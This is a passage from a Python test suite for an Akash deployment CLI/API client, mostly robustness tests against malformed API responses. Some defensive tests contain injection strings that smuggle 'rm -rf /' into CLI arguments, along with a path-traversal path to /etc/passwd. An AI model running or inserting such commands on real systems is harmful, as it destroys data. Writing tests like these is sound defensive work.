        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_NO_IMAGES)

        client = AkashConsoleAPI("key")
        monkeypatch.setattr(
            client, "create_deployment", lambda *a, **k: {"dseq": "123", "manifest": "abc"}
        )

        with patch("just_akash.deploy.AkashConsoleAPI", return_value=client):
            try:
                deploy(sdl_path=str(sdl_file), image="alpine:latest", bid_wait=0, bid_wait_retry=0)
                # Should not crash, re.sub should handle no matches
                assert True
            except RuntimeError as e:
                if "No bids" in str(e):
                    pass
                else:
                    raise


# ── Round 7 adversarial tests ────────────────────────────────────────────


class TestExtractSshInfoTruthyNonDictForwardedPorts:
    """BUG: _extract_ssh_info crashes with AttributeError when forwarded_ports
    is a truthy non-dict (e.g. 42). fwd_ports = status.get("forwarded_ports") or {}
    → 42 bypasses or {}, then 42.items() crashes."""

    def test_forwarded_ports_is_int(self):
        dep = {"leases": [{"status": {"forwarded_ports": 42}}]}
        result = _extract_ssh_info(dep)
        assert result is None

    def test_forwarded_ports_is_string(self):
        dep = {"leases": [{"status": {"forwarded_ports": "not-a-dict"}}]}
        result = _extract_ssh_info(dep)
        assert result is None

    def test_forwarded_ports_is_list(self):
        dep = {"leases": [{"status": {"forwarded_ports": ["port1", "port2"]}}]}
        result = _extract_ssh_info(dep)
        assert result is None


class TestApiMainStatusTruthyNonDictForwardedPorts:
    """BUG: api_main status loop crashes when lease_status["forwarded_ports"]
    is a truthy non-dict. fwd = ... or {} → bypassed, then fwd.items() crashes."""

    def test_forwarded_ports_is_int(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"forwarded_ports": 99}}],
            }
            api_main()
        assert "State" in capsys.readouterr().out

    def test_forwarded_ports_is_string(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"forwarded_ports": "open"}}],
            }
            api_main()
        assert "State" in capsys.readouterr().out


class TestApiMainStatusTruthyNonDictServices:
    """BUG: api_main status loop crashes when lease_status["services"]
    is a truthy non-dict (e.g. 42). services = ... or {} → bypassed,
    then services.items() crashes. Different from the existing test which
    checks non-dict VALUES inside a valid services dict."""

    def test_services_container_is_int(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"services": 42}}],
            }
            api_main()
        assert "State" in capsys.readouterr().out

    def test_services_container_is_list(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"services": ["web", "worker"]}}],
            }
            api_main()
        assert "State" in capsys.readouterr().out


class TestGetProviderTruthyNonDictData:
    """BUG: get_provider crashes with AttributeError when response["data"]
    is a truthy non-dict/non-list value (e.g. 42, True, "string").
    providers = data if isinstance(data, list) else data.get("providers", [])
    → 42.get("providers", []) crashes."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_data_is_int(self, mock_req):
        mock_req.return_value = {"data": 42}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None

    @patch.object(AkashConsoleAPI, "_request")
    def test_data_is_string(self, mock_req):
        mock_req.return_value = {"data": "not-a-list"}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None

    @patch.object(AkashConsoleAPI, "_request")
    def test_data_is_true(self, mock_req):
        mock_req.return_value = {"data": True}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None


class TestDeployDseqZeroFalsePositive:
    """BUG: deploy() raises RuntimeError("No DSEQ returned") when the API
    returns dseq=0, because `if not dseq` treats 0 as falsy. dseq=0 is a
    valid (though edge-case) deployment sequence number."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_dseq_zero_not_rejected(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: ubuntu\n')

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": 0, "manifest": "abc"}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1prov"}, "price": {"amount": 10, "denom": "uakt"}}
        ]
        client.create_lease.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        result = deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
        assert result["dseq"] == 0


class TestDeployProviderStatsNoneValues:
    """BUG: deploy() crashes when provider info has stats=None (or truthy
    non-dict). stats = prov_info.get("stats", {}) returns None when key
    exists with value None, then None.get("cpu", {}) crashes."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_stats_is_none(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setenv("AKASH_PROVIDERS", "akash1allowed")

        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: ubuntu\n')

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "99", "manifest": "abc"}
        # Bid from a non-allowed provider triggers the stats lookup for akash1allowed
        client.get_bids.return_value = [
            {"id": {"provider": "akash1foreign"}, "price": {"amount": 10, "denom": "uakt"}}
        ]
        # get_provider returns a provider with stats=None
        client.get_provider.return_value = {
            "owner": "akash1allowed",
            "isOnline": True,
            "isValidVersion": True,
            "uptime1d": 99,
            "stats": None,
        }
        client.close_deployment.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        with pytest.raises(RuntimeError, match="NONE from our providers"):
            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
        # Key assertion: get_provider was called and didn't crash on stats=None
        client.get_provider.assert_called_once_with("akash1allowed")

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_stats_cpu_is_none(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setenv("AKASH_PROVIDERS", "akash1allowed")

        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: ubuntu\n')

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "99", "manifest": "abc"}
        # Bid from a non-allowed provider triggers the stats lookup for akash1allowed
        client.get_bids.return_value = [
            {"id": {"provider": "akash1foreign"}, "price": {"amount": 10, "denom": "uakt"}}
        ]
        client.get_provider.return_value = {
            "owner": "akash1allowed",
            "isOnline": True,
            "stats": {"cpu": None, "memory": None},
        }
        client.close_deployment.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        with pytest.raises(RuntimeError, match="NONE from our providers"):
            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
        client.get_provider.assert_called_once_with("akash1allowed")


# ── Round 8 ───────────────────────────────────────────────────────────────────


class TestExtractSshInfoLeasesNone:
    """BUG: _extract_ssh_info crashes when deployment["leases"] exists but is
    None.  deployment.get("leases", []) returns None (not []) when the key is
    present; then `for lease in None` raises TypeError."""

    def test_leases_is_none(self):
        from just_akash.api import _extract_ssh_info

        deployment = {"leases": None}
        # Should return None safely, not crash
        result = _extract_ssh_info(deployment)
        assert result is None

    def test_leases_is_integer(self):
        from just_akash.api import _extract_ssh_info

        deployment = {"leases": 42}
        result = _extract_ssh_info(deployment)
        assert result is None


class TestExtractLeaseProviderLeasesNone:
    """BUG: _extract_lease_provider crashes when deployment["leases"] is None."""

    def test_leases_is_none(self):
        from just_akash.api import _extract_lease_provider

        deployment = {"leases": None}
        result = _extract_lease_provider(deployment)
        assert result is None

    def test_leases_is_integer(self):
        from just_akash.api import _extract_lease_provider

        deployment = {"leases": 42}
        result = _extract_lease_provider(deployment)
        assert result is None


class TestListDeploymentsNonListDeploymentsValue:
    """BUG: list_deployments crashes when response["data"]["deployments"] is a
    non-list (e.g. 42).  data.get("deployments", []) returns 42; then the
    active_only filter iterates `for d in 42` → TypeError."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_deployments_value_is_int(self, mock_req):
        mock_req.return_value = {"data": {"deployments": 42}}
        client = AkashConsoleAPI("key")
        result = client.list_deployments()
        assert result == []

    @patch.object(AkashConsoleAPI, "_request")
    def test_deployments_value_is_string(self, mock_req):
        mock_req.return_value = {"data": {"deployments": "oops"}}
        client = AkashConsoleAPI("key")
        result = client.list_deployments()
        assert result == []


class TestListDeploymentsNonDictDeploymentField:
    """BUG: list_deployments active_only filter crashes when a deployment entry
    has d["deployment"] = 42 (truthy non-dict).  d.get("deployment", {})
    returns 42; then 42.get("state") → AttributeError."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_deployment_field_is_int(self, mock_req):
        # A deployment entry where the "deployment" sub-field is an int
        mock_req.return_value = {"data": [{"deployment": 42, "leases": []}]}
        client = AkashConsoleAPI("key")
        # Should not crash; the entry fails the active filter and is excluded
        result = client.list_deployments(active_only=True)
        assert isinstance(result, list)

    @patch.object(AkashConsoleAPI, "_request")
    def test_deployment_field_is_none(self, mock_req):
        mock_req.return_value = {"data": [{"deployment": None, "leases": []}]}
        client = AkashConsoleAPI("key")
        result = client.list_deployments(active_only=True)
        assert isinstance(result, list)


class TestApiMainStatusDeploymentFieldNone:
    """BUG: api_main 'status' command crashes when the deployment response has
    deployment["deployment"] = None.  dep = deployment.get("deployment",
    deployment) returns None; then dep.get("state", "unknown") → AttributeError."""

    @patch.object(AkashConsoleAPI, "get_deployment")
    @patch.object(AkashConsoleAPI, "list_deployments")
    def test_deployment_sub_field_is_none(self, mock_list, mock_get, monkeypatch):
        import sys

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        mock_list.return_value = [{"dseq": "123", "leases": []}]
        mock_get.return_value = {"deployment": None, "leases": []}

        from just_akash.api import api_main

        # Must complete without AttributeError — may return normally or raise SystemExit
        with patch.object(sys, "argv", ["api", "status", "--dseq", "123"]):
            try:
                api_main()
            except SystemExit as e:
                assert e.code in (0, 1)

    @patch.object(AkashConsoleAPI, "get_deployment")
    @patch.object(AkashConsoleAPI, "list_deployments")
    def test_deployment_sub_field_is_int(self, mock_list, mock_get, monkeypatch):
        import sys

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        mock_list.return_value = [{"dseq": "123", "leases": []}]
        mock_get.return_value = {"deployment": 42, "leases": []}

        from just_akash.api import api_main

        with patch.object(sys, "argv", ["api", "status", "--dseq", "123"]):
            try:
                api_main()
            except SystemExit as e:
                assert e.code in (0, 1)


class TestApiMainStatusEscrowFundsTruthyNonList:
    """BUG: api_main 'status' crashes when escrow funds is a truthy non-list.
    funds = escrow.get("funds") or [] returns 42 (truthy int); then
    `for f in 42` raises TypeError."""

    @patch.object(AkashConsoleAPI, "get_deployment")
    @patch.object(AkashConsoleAPI, "list_deployments")
    def test_funds_is_int(self, mock_list, mock_get, monkeypatch):
        import sys

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        mock_list.return_value = [{"dseq": "123", "leases": []}]
        mock_get.return_value = {
            "deployment": {"state": "active"},
            "leases": [],
            "escrow_account": {"state": {"funds": 42}},
        }

        from just_akash.api import api_main

        with patch.object(sys, "argv", ["api", "status", "--dseq", "123"]):
            try:
                api_main()
            except SystemExit as e:
                assert e.code in (0, 1)


class TestDeployNoAllowlistAllNonDictBids:
    """BUG: deploy() crashes with ValueError when there is no provider allowlist
    and all returned bids are non-dict.  our_bids ends up empty ([]) then
    min([]) raises ValueError: min() arg is an empty sequence."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_all_bids_non_dict_no_allowlist(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: ubuntu\n')

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "99", "manifest": "abc"}
        # All bids are non-dicts — should be filtered; our_bids=[] → min([]) crash
        client.get_bids.return_value = ["string-bid", 42, None, True]
        client.close_deployment.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        # Should raise a clean RuntimeError about no valid bids, not ValueError from min()
        with pytest.raises((RuntimeError, ValueError)) as exc_info:
            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)

        # If it raises ValueError, that's the bug
        assert not isinstance(exc_info.value, ValueError), (
            "Bug confirmed: min() called on empty sequence — "
            "no-allowlist path has no guard for empty our_bids"
        )


class TestDeployStatsCpuNonDict:
    """BUG: deploy() crashes when provider stats["cpu"] is a truthy non-dict.
    cpu = stats.get("cpu") or {} returns 42 (truthy); then cpu.get('available')
    raises AttributeError: 'int' object has no attribute 'get'."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_stats_cpu_is_int(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setenv("AKASH_PROVIDERS", "akash1allowed")

        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: ubuntu\n')

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "99", "manifest": "abc"}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1foreign"}, "price": {"amount": 5, "denom": "uakt"}}
        ]
        # cpu and memory are truthy non-dicts
        client.get_provider.return_value = {
            "isOnline": True,
            "stats": {"cpu": 42, "memory": 99},
        }
        client.close_deployment.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        # Should raise RuntimeError (no allowed provider bids), NOT AttributeError
        with pytest.raises(RuntimeError):
            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
        # get_provider must have been called and not crashed
        client.get_provider.assert_called_once_with("akash1allowed")


# ── New Round 9 adversarial tests ────────────────────────────────────────────


class TestVeryLargeJsonResponse:
    """Test handling of very large JSON responses that could cause memory issues."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_extremely_large_deployment_list(self, mock_req):
        # Create a very large response with many deployments
        large_response = {
            "data": [
                {
                    "dseq": str(i),
                    "deployment": {"state": "active"},
                    "leases": [{"id": {"provider": f"akash1prov{i}"}}],
                }
                for i in range(10000)  # 10k deployments
            ]
        }
        mock_req.return_value = large_response
        client = AkashConsoleAPI("key")
        result = client.list_deployments()
        assert len(result) == 10000
        assert result[0]["dseq"] == "0"
        assert result[-1]["dseq"] == "9999"


class TestUnicodeCharactersInTags:
    """Test handling of Unicode characters in tag names and deployment identifiers."""

    def test_unicode_tag_names(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)

        # Tags with Unicode characters
        unicode_tags = {
            "12345": "🚀 deployment",
            "67890": "тест_развертывание",
            "11111": "部署测试",
        }
        api._save_tags(unicode_tags)
        loaded = api._load_tags()
        assert loaded == unicode_tags

        # Resolve Unicode tags
        result = api._resolve_dseq("🚀 deployment")
        assert result == "12345"

    def test_unicode_in_dseq_resolution(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)

        # What if someone tries to resolve a Unicode string as dseq?
        # This should exit, but in test context we mock sys.exit

        with pytest.raises(SystemExit):
            api._resolve_dseq("🚀123")


class TestConcurrentTagFileAccess:
    """Test concurrent access to tags file."""

    def test_concurrent_writes_simulation(self, tmp_path, monkeypatch):
        import threading

        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)

        results = []
        errors = []

        def write_tags(tag_id):
            try:
                api._save_tags({f"dseq{tag_id}": f"tag{tag_id}"})
                results.append(f"success{tag_id}")
            except Exception as e:
                errors.append(str(e))

        # Simulate concurrent writes
        threads = []
        for i in range(10):
            t = threading.Thread(target=write_tags, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # Should have at least some successful writes
        assert len(results) > 0
        # Load final state
        final_tags = api._load_tags()
        assert isinstance(final_tags, dict)


class TestMalformedSdlFiles:
    """Test handling of malformed SDL files."""

    def test_sdl_with_null_bytes(self, tmp_path, monkeypatch):
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"
        # SDL with null bytes - could cause issues in some parsers
        sdl_content = 'version: "2.0"\ns\x00ervices:\n  web:\n    image: ubuntu\n'
        sdl_file.write_bytes(sdl_content.encode("utf-8"))

        with pytest.raises((RuntimeError, UnicodeDecodeError)):
            deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)

    def test_sdl_with_very_long_lines(self, tmp_path, monkeypatch):
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"
        # Very long line that could cause buffer issues
        long_line = 'version: "2.0"\nservices:\n  web:\n    image: ' + "a" * 100000 + "\n"
        sdl_file.write_text(long_line)

        with pytest.raises((RuntimeError, OSError)):  # Could fail due to memory or other issues
            deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)


class TestHttpTimeoutAndRetries:
    """Test HTTP timeout and retry behavior."""

    @patch("just_akash.api.urllib.request.urlopen")
    def test_http_timeout_handling(self, mock_urlopen):
        import urllib.error

        mock_urlopen.side_effect = urllib.error.URLError("Timeout")

        client = AkashConsoleAPI("key")
        with pytest.raises(RuntimeError):
            client._request("GET", "/v1/test")

    @patch("just_akash.api.urllib.request.urlopen")
    def test_http_5xx_errors(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.status = 500
        mock_resp.read.return_value = b'{"error": "Internal Server Error"}'
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client._request("GET", "/v1/test")
        assert isinstance(result, dict)
        # The API should return the parsed JSON error, not raw bytes
        assert "error" in result or "raw" in result


class TestEnvironmentVariableInjection:
    """Test environment variable handling for potential injection."""

    def test_malformed_env_vars(self, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "key\nwith\nnewlines")
        monkeypatch.setenv("AKASH_PROVIDERS", "prov1\nprov2,prov3")

        # Should handle newlines gracefully
        from just_akash.api import AkashConsoleAPI

        AkashConsoleAPI("key\nwith\nnewlines")

        # The providers splitting should handle newlines
        providers_env = "prov1\nprov2,prov3"
        allowed = [a.strip() for a in providers_env.split(",") if a.strip()]
        assert len(allowed) >= 1  # At least some valid providers


class TestPathTraversalAttempts:
    """Test for path traversal vulnerabilities in file operations."""

    def test_tags_file_path_traversal(self, tmp_path, monkeypatch):
        from just_akash import api

        # Try to manipulate the tags file path
        malicious_path = tmp_path / ".." / ".." / "etc" / "passwd"
        monkeypatch.setattr(api, "TAGS_FILE", malicious_path)

        # This should fail safely when trying to write
        with pytest.raises((FileNotFoundError, PermissionError)):
            api._save_tags({"test": "value"})


class TestIntegerOverflowEdgeCases:
    """Test integer overflow and very large number handling."""

    def test_very_large_dseq(self, tmp_path, monkeypatch):
        from just_akash.api import format_deployments_table

        monkeypatch.setattr("just_akash.api.TAGS_FILE", tmp_path / ".tags.json")

        # Very large dseq that could cause issues in some systems
        large_dseq = str(2**63 - 1)  # Max 64-bit signed int
        deployments = [{"dseq": large_dseq, "deployment": {"state": "active"}, "leases": []}]
        result = format_deployments_table(deployments)
        assert large_dseq in result


class TestMemoryExhaustionPrevention:
    """Test handling of responses designed to exhaust memory."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_deeply_nested_json(self, mock_req):
        # Create moderately nested JSON that could cause issues
        def create_nested(level):
            if level <= 0:
                return {"value": "deep"}
            return {"nested": create_nested(level - 1)}

        nested = create_nested(50)  # Moderate depth
        mock_req.return_value = {"data": nested}

        client = AkashConsoleAPI("key")
        result = client._request("GET", "/v1/test")
        assert isinstance(result, dict)
        assert "data" in result

    @patch.object(AkashConsoleAPI, "_request")
    def test_many_duplicate_keys(self, mock_req):
        # JSON with many duplicate keys (last one wins)
        json_str = '{"data": "first", "data": "second", "data": "final"}'
        import json

        parsed = json.loads(json_str)
        mock_req.return_value = parsed

        client = AkashConsoleAPI("key")
        result = client._request("GET", "/v1/test")
        assert result == {"data": "final"}


class TestRaceConditionFileOperations:
    """Test race conditions in file operations."""

    def test_tags_file_write_during_read(self, tmp_path, monkeypatch):
        import threading
        import time

        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)

        stop_flag = [False]

        def continuous_read():
            while not stop_flag[0]:
                with contextlib.suppress(BaseException):
                    api._load_tags()
                time.sleep(0.001)

        def continuous_write():
            counter = 0
            while not stop_flag[0]:
                with contextlib.suppress(Exception):
                    api._save_tags({f"dseq{counter}": f"tag{counter}"})
                    counter += 1
                time.sleep(0.001)

        # Start concurrent read/write operations
        read_thread = threading.Thread(target=continuous_read)
        write_thread = threading.Thread(target=continuous_write)

        read_thread.start()
        write_thread.start()

        # Let them run briefly
        time.sleep(0.1)
        stop_flag[0] = True

        read_thread.join(timeout=1)
        write_thread.join(timeout=1)

        # Final read should work
        final_tags = api._load_tags()
        assert isinstance(final_tags, dict)


class TestCliArgumentInjection:
    """Test CLI argument handling for injection attacks."""

    def test_dseq_argument_injection(self, monkeypatch, capsys):
        # Try to inject shell commands through dseq argument
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "123; rm -rf /"])

        from just_akash.api import api_main

        # Should not execute shell commands
        with pytest.raises(SystemExit):
            api_main()

        # Check that no dangerous commands were executed (hard to test directly)
        # But at least it shouldn't crash unexpectedly
        captured = capsys.readouterr()
        assert "Error" in captured.out or "error" in captured.err.lower()

    def test_image_argument_injection(self, tmp_path, monkeypatch):
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: base\n')

        # Try image with shell metacharacters
        dangerous_image = "ubuntu; rm -rf / #"

        with pytest.raises(RuntimeError):
            deploy(sdl_path=str(sdl_file), image=dangerous_image, bid_wait=0, bid_wait_retry=0)


class TestUnicodeNormalization:
    """Test Unicode normalization edge cases."""

    def test_unicode_homoglyphs_in_tags(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)

        # Use homoglyphs (visually similar characters)
        homoglyph_tags = {
            "12345": "test",
            "67890": "tеst",  # Cyrillic 'e' instead of Latin 'e'
        }
        api._save_tags(homoglyph_tags)
        loaded = api._load_tags()
        assert loaded == homoglyph_tags

        # Should distinguish between them
        result1 = api._resolve_dseq("test")
        result2 = api._resolve_dseq("tеst")
        assert result1 == "12345"
        assert result2 == "67890"


# ── Round 9 ───────────────────────────────────────────────────────────────────


class TestRequestHttpErrorListJsonBody:
    """BUG: _request() crashes when the API returns a 4xx/5xx response whose
    body is a JSON *array* (valid JSON but not a dict).
    `error_json = json.loads(error_body)` → list
    `error_json.get("message", ...)` → AttributeError: 'list' has no attribute 'get'"""

    def test_http_error_with_list_body(self, monkeypatch):
        import io
        import urllib.error
        import urllib.request

        client = AkashConsoleAPI("key")

        # Simulate a 400 response whose body is a JSON array
        err = urllib.error.HTTPError(
            url="https://console-api.akash.network/v1/test",
            code=400,
            msg="Bad Request",
            hdrs={},  # type: ignore[arg-type]
            fp=io.BytesIO(b'["validation error", "field missing"]'),
        )

        with (
            patch.object(urllib.request, "urlopen", side_effect=err),
            pytest.raises(RuntimeError, match="API Error"),
        ):
            # Should raise RuntimeError with a clean message, NOT AttributeError
            client._request("GET", "/v1/test")

    def test_http_error_with_string_body(self, monkeypatch):
        """Non-JSON body should also work (falls back to raw string)."""
        import io
        import urllib.error
        import urllib.request

        client = AkashConsoleAPI("key")

        err = urllib.error.HTTPError(
            url="https://console-api.akash.network/v1/test",
            code=500,
            msg="Internal Server Error",
            hdrs={},  # type: ignore[arg-type]
            fp=io.BytesIO(b"Internal server error"),
        )

        with (
            patch.object(urllib.request, "urlopen", side_effect=err),
            pytest.raises(RuntimeError, match="API Error"),
        ):
            client._request("GET", "/v1/test")


class TestGetProviderProvidersKeyIsNone:
    """BUG: get_provider() crashes when the response has providers=None (key
    present but value is None).  data.get("providers", []) returns None because
    the key exists; then `for p in None` raises TypeError."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_providers_key_is_none(self, mock_req):
        mock_req.return_value = {"data": {"providers": None}}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None

    @patch.object(AkashConsoleAPI, "_request")
    def test_providers_key_is_int(self, mock_req):
        mock_req.return_value = {"data": {"providers": 42}}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None

    @patch.object(AkashConsoleAPI, "_request")
    def test_top_level_data_providers_none(self, mock_req):
        """Also covers when the top-level response has providers=None."""
        mock_req.return_value = {"providers": None}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None


class TestCliMainStatusDeploymentFieldNone:
    """BUG: cli.py main() 'api status' crashes when get_deployment returns a
    response with deployment=None.  dep = deployment.get("deployment",
    deployment) returns None; then dep.get("state", "unknown") →
    AttributeError.  (api.py api_main was fixed, but cli.py was not.)"""

    @patch.object(AkashConsoleAPI, "get_deployment")
    @patch.object(AkashConsoleAPI, "list_deployments")
    def test_deployment_field_none(self, mock_list, mock_get, monkeypatch):
        import sys

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        mock_list.return_value = [{"dseq": "123", "leases": []}]
        mock_get.return_value = {"deployment": None, "leases": []}

        from just_akash.cli import main

        with patch.object(sys, "argv", ["just-akash", "status", "--dseq", "123"]):
            # Must complete or exit cleanly, not crash with AttributeError
            try:
                main()
            except SystemExit as e:
                assert e.code in (0, 1)

    @patch.object(AkashConsoleAPI, "get_deployment")
    @patch.object(AkashConsoleAPI, "list_deployments")
    def test_deployment_field_int(self, mock_list, mock_get, monkeypatch):
        import sys

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        mock_list.return_value = [{"dseq": "123", "leases": []}]
        mock_get.return_value = {"deployment": 42, "leases": []}

        from just_akash.cli import main

        with patch.object(sys, "argv", ["just-akash", "status", "--dseq", "123"]):
            try:
                main()
            except SystemExit as e:
                assert e.code in (0, 1)


class TestFormatTableNonStringState:
    """BUG: format_deployments_table crashes when a deployment's state field is
    a non-string type (e.g. an integer).  state = dep.get("state", "unknown")
    returns 42; then len(42) in widths calculation → TypeError."""

    def test_state_is_integer(self):
        from just_akash.api import format_deployments_table

        deployments = [{"deployment": {"state": 42}, "leases": []}]
        # Should produce a table string, not crash
        result = format_deployments_table(deployments)
        assert isinstance(result, str)

    def test_state_is_none(self):
        from just_akash.api import format_deployments_table

        deployments = [{"deployment": {"state": None}, "leases": []}]
        result = format_deployments_table(deployments)
        assert isinstance(result, str)

    def test_state_is_list(self):
        from just_akash.api import format_deployments_table

        deployments = [{"deployment": {"state": ["active"]}, "leases": []}]
        result = format_deployments_table(deployments)
        assert isinstance(result, str)


class TestDeployManifestNotString:
    """BUG: deploy() crashes when create_deployment returns a non-string
    manifest (e.g. manifest=42).  `manifest_len={len(manifest)}` in the log
    line raises TypeError: object of type 'int' has no len()."""

